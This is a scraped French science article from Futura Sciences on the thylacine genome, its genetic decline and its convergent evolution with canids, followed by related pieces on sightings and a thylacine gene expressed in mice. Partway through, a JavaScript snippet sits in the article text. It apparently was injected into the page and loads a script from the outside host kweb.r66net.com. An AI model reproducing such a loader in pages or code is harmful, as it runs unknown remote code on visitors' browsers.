{"title": "Tigre de Tasmanie : la génétique explique pourquoi il a disparu", "newspaper": "Futura Sciences", "author": "Marie-Céline Jacquier", "date_publi": "12/12/2017", "content": "Le génome du thylacine, ou tigre de Tasmanie, a été séquencé à partir d'un spécimen de plus de cent ans, donnant des clés pour mieux comprendre les causes de sa disparition. L'étude affirme qu'il était déjà en  « mauvaise santé génétique »  avant l'arrivée de l'homme en Australie il y a 50.000 ans. Le  tigre de Tasmanie , ou thylacine ( Thylacinus cynocephalus ), était un  marsupial  carnivore qui vivait en Australie, d'où il a disparu il y a 3.000 ans. La population se limitait à l'île de Tasmanie et elle y a survécu jusqu'au début du 20 e  siècle. C'est l'arrivée de bergers européens qui a précipité la fin de l' espèce , d'autant plus que le gouvernement offrait une récompense pour chaque animal tué. Le dernier thylacine connu est mort en captivité en 1936. Le thylacine possède une poche marsupiale dans laquelle se développe le petit. Son dos porte des rayures caractéristiques, d'où son nom. Anatomiquement, il ressemble beaucoup à un canidé mais ne lui est pas du tout apparenté puisque les marsupiaux ont divergé du reste des  mammifères  il y a fort longtemps, bien avant l'apparition des canidés et du tigre de Tasmanie. Mais qu'en est-il sur le plan génétique ? Pour en savoir plus sur l'histoire évolutive de ces animaux, une équipe internationale de chercheurs a voulu séquencer leur  génome . Pour cela, ils ont utilisé un spécimen bien conservé d'un jeune datant de 106 ans, provenant de la collection d'un musée australien. L' ADN  a été extrait et séquencé, ce qui a permis de replacer le thylacine dans un arbre phylogénétique. Andrew Pask, un des auteurs de ces travaux, a expliqué dans un  communiqué de l’université de Melbourne  que  « le tigre de Tasmanie appartient à une lignée sœur des  Dasyuridae , la famille qui inclut le  diable de Tasmanie  et la souris marsupiale. » Le génome a aussi montré que le thylacine était en mauvaise santé génétique, avec une faible diversité génétique, avant même l'arrivée des humains en Australie. Le  diable de Tasmanie , son proche cousin, souffrait du même problème de faible diversité génétique avant d'être isolé en Tasmanie. Du point de vue phylogénétique, le diable de Tasmanie est le plus proche cousin vivant du thylacine. © Oleksii, Fotolia                               Canidés et thylacine sont un exemple d’évolution convergente Mais cette étude génétique apporte aussi de nouvelles informations sur la façon dont l'animal a évolué pour ressembler à un  chien  en dépit de son éloignement avec cette espèce. Le thylacine et les canidés sont un bel exemple d'évolution convergente : ce sont des organismes éloignés qui ont évolué indépendamment et ont fini par se ressembler pour s'adapter à des environnements et des modes vie similaires. En raison de leur technique de chasse et de leur alimentation à base de viande fraîche, le  crâne  et la forme du corps sont devenus semblables. Pour l'Australien Andrew Pask,  « l'apparence du thylacine est presque celle d'un dingo avec une poche »  (rappelons que le dingo est une race de chien sauvage apparue en Australie).  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  “ L'apparence du thylacine est presque un dingo avec une poche L'équipe a analysé les caractéristiques du crâne du thylacine. Christy Hipsley, du muséum Victoria a expliqué :  « nous avons découvert que le tigre de Tasmanie avait une forme de crâne plus semblable à celle du renard roux et du loup gris qu'à celle de ses plus proches parents. »  Du point de vue génétique, cette évolution convergente ne serait pas due aux gènes eux-mêmes qui auraient produit la même forme de crâne et de corps ; les responsables seraient plutôt les régions de contrôle entourant ces gènes qui « allument » ou « éteignent » les gènes aux différentes étapes de la croissance.  L'espoir des chercheurs est que cette recherche aide à sauvegarder d'autres espèces menacées, comme le diable de Tasmanie. Pourrait-on « ressusciter » le thylacine avec son génome ? Pour Andrew Pask,  « comme ce génome est l'un des plus complets pour une espèce éteinte, techniquement, c'est la première étape pour \"ressusciter le thylacine\", mais nous sommes encore loin de cette possibilité ».  Et pour y parvenir,  « nous aurions encore besoin de développer un modèle animal marsupial pour héberger le génome du thylacine, comme le travail mené pour inclure des gènes de mammouth dans l'éléphant moderne. » Voir aussi : Des scientifiques pensent à \"ressusciter\" 4 espèces animales disparues Ces résultats paraissent dans  Nature Ecology and Evolution . Pour en savoir plus Le tigre de Tasmanie a-t-il vraiment disparu ? Article de Marie-Céline Jacquier paru le 30 mars 2017 Le tigre de Tasmanie est une espèce considérée comme éteinte depuis des décennies, mais des chercheurs veulent en avoir le cœur net suite à des témoignages troublants. Ils prévoient l'installation de 50 caméras dans le nord du Queensland, sur la  péninsule  du cap York, en Australie. Officiellement, le tigre de Tasmanie (aussi appelé « thylacine ») a disparu en 1936, lorsque que le dernier représentant de l'espèce est mort au zoo de Hobart, dans l'île de Tasmanie, située au sud de l'Australie. Sur le continent australien, il serait éteint depuis des siècles déjà. Pourtant, régulièrement, des personnes affirment avoir vu des animaux qui ne sont ni des  dingos  ni des renards et qui ressembleraient à l'animal disparu. Des récits qui ont longtemps été jugés avec beaucoup de scepticisme. Pourtant, cette fois-ci, de récents témoignages ont intrigué des scientifiques de l'université James Cook. Ainsi, le professeur Bill Laurence a expliqué avoir parlé à deux personnes qui avaient vu des animaux qui pourraient être des tigres de Tasmanie sur la péninsule du cap York, dans le nord du Queensland. L'un d'eux était un employé des parcs nationaux du Queensland et l'autre un campeur chevronné. À chaque fois, les animaux ont été vus la nuit :  « Dans un cas, quatre animaux ont été observés à proximité — à environ 20 pieds [6 mètres,  NDLR ] de distance  —  avec un  projecteur  »,  décrit le chercheur dans un  communiqué . Un tigre de Tasmanie en captivité au zoo de Hobart en 1933. © DP                               50 caméras installées sur la péninsule du cap York Les animaux auraient été observés dans deux lieux différents de la péninsule du cap York, leur localisation exacte est gardée secrète. Les témoignages fournissent des descriptions plausibles et détaillées : la description des  yeux , de la taille, de la forme et du comportement ne correspondait à aucune grande espèce du nord du Queensland (dingo, chien sauvage ou  sanglier ). L'université envisage donc d'installer 50 caméras dans la péninsule, mais pas avant le mois d'avril, afin d'attendre les autorisations et de meilleures conditions climatiques.  Le saviez-vous ? Le tigre de Tasmanie, aussi appelé « thylacine », est un mammifère marsupial dont le plus proche cousin vivant est le diable de Tasmanie. Dans  The Guardian , Sandra Abell, chercheuse à l'université James Cook, a expliqué que les scientifiques ont été contactés par d'autres personnes depuis que leur recherche a été rendue publique. Elle estime que, même si ces caméras ne filment pas de tigres de Tasmanie, l'enquête apportera des informations sur les espèces rares et menacées vivant de ce secteur. Pour elle, il n'est pas impossible que le thylacine soit toujours vivant :  « Les gens qui disent qu'ils les ont vus peuvent les décrire en détail, c'est difficile de dire qu'ils ont vu autre chose ». Un gène du tigre de Tasmanie ressuscité chez une souris Article de  Jean-Luc Goudet , paru le 21 mai 2008 À partir de fragments de chair et de peau provenant du thylacine, un marsupial disparu, des chercheurs ont isolé un  gène  et l'ont rendu fonctionnel en l'intégrant dans un génome de souris. Ce résultat est une première et laisse espérer un nouveau moyen d'étudier des espèces récemment éteintes, ainsi qu'une meilleure connaissance des mécanismes de l'évolution. Le but d'Andrew J. Pask, Richard R. Behringer (université du Texas) et de Marilyn B. Renfree (université de Melbourne) n'était pas de réaliser une  chimère  ou de tenter de faire revenir à la vie un animal disparu à la manière du scénario de  Jurassic Park . Les trois chercheurs voulaient surtout étudier de plus près  Thylacinus cynocephalus , ou thylacine, ou  tigre de Tasmanie , ou encore loup marsupial. Cet animal ressemblait étonnamment à un chien, mais en était en quelque sorte la version marsupiale. Son cousin actuel le plus proche est le diable de Tasmanie, vivant sur l'île du même nom, au sud de l'Australie. C'est là également que vivait le thylacine, après avoir abandonné l'Australie il y a plusieurs milliers d'années. Abondamment chassé au dix-neuvième siècle parce qu'on l'accusait de massacrer les moutons, il était déjà en voie d' extinction  au début du vingtième siècle. Le dernier spécimen serait mort en 1936 au zoo de Hobart, en Tasmanie. Il a été heureusement abondamment photographié mais aussi  filmé . L'équipe américano-australienne, dont le travail vient d'être publié dans la revue  Plos One , a extrait de minuscules quantités d'ADN (200 nanogrammes à 1 microgramme) de quatre restes de thylacine datant d'une centaine d'années, en l'occurrence trois  embryons  conservés dans de l' alcool  et un fragment de peau avec son pelage. Les chercheurs ont jeté leur dévolu sur un gène, Col2a1, et plus précisément sur son  enhancer , c'est-à-dire une séquence d'ADN qui conduit à augmenter la  transcription  de ce gène. Peu modifié par l'évolution, cet élément se retrouve chez tous les mammifères. Chez la souris, le gène Col2a1 favorise la synthèse du  cartilage . Après avoir vérifié que le gène extrait était bien celui du thylacine (et non, par  contamination , celui d'un être humain ou d'une souris fréquentant le laboratoire), les chercheurs ont pu analyser sa séquence, qui le rapproche du gène similaire du wallabie de l'île Eugène ( Macropus eugenii ), un autre mammifère marsupial. Par des techniques de  génie génétique , ces gènes ont été insérés dans des embryons de souris où ils se sont correctement intégrés au génome. Grâce à des colorations spécifiques, les chercheurs ont démontré que l' enhancer  du Tigre de Tasmanie s'exprimait effectivement, conduisant, comme celui de la souris, à stimuler l'activité des  chondrocytes , les cellules fabriquant le cartilage (qui deviendra de l'os chez l'adulte). En a, jeune mâle photographié au zoo de Hobart en 1928. En  b , un embryon de thylacine, conservé dans l'alcool au Museum Victoria, qui a servi à l'étude. A gauche, en  c  et en  e , crâne de thylacine. Sa forme ressemble de façon surprenante à celui du chien domestique ( Canis canis ), montré en  d  et en  f . © Andrew J. Pask, Richard R. Behringer, Marilyn B. Renfree/ PLoS One                       Un mécanisme génétique complexe, mais à peine changé depuis 150 millions d'années Si cet  enhancer  est toujours fonctionnel, c'est que le gène Col2a1 a le même rôle dans la genèse du cartilage chez le thylacine et chez la souris. Or, les lignées auxquelles appartiennent ces deux mammifères ont divergé il y a 148 millions d'années. Cette indication est précieuse pour les biologistes, qui cherchent toujours à mieux comprendre la manière dont s'expriment les gènes. Leur fonction, qui est de servir à la fabrication d' enzymes , est régulée de manière complexe par d'autres éléments du génome, comme les  enhancers  et les promoteurs (faisant partie de ce que l'on a longtemps appelé la partie non-codante). Il semble aujourd'hui que l' évolution des espèces  puisse reposer sur des modifications de cette régulation. De minuscules changements dans le génome peuvent ainsi aboutir à de grandes conséquences au niveau de l'organisme. Cet effet expliquerait notamment pourquoi, chez les mammifères, les gènes de la partie codante (et donc les  protéines ) diffèrent peu d'une espèce à l'autre. Ce travail démontre aussi la possibilité d'étudier des animaux disparus jusque dans leur génome. A ce titre, ce n'est pas une première puisqu'un gène, impliqué dans la fabrication des  pigments  de la peau, a été étudié  in vitro  grâce à des restes de mammouths et d'homme de  Néandertal . Mais l'expérience a été conduite plus loin, avec une expression  in vivo , permettant de vérifier jusqu'au bout la fonctionnalité du gène. «  A l'heure où le rythme d'extinction d'espèces atteint un niveau alarmant, spécialement chez les mammifères, la [découverte de cette possibilité] est cruciale  » insiste Marilyn Renfree, de l'université de Melbourne. Cela vous intéressera aussi Voyage en Nouvelle-Zélande, la terre aux mille paysages                       Bienvenue en Nouvelle-Zélande, l'un des plus beaux laboratoires naturels du monde, où l'eau, la glace et le vent s'activent pour sculpter des paysages à couper le souffle, au milieu des volcans et sommets enneigés.                                       ", "theme": "planete"}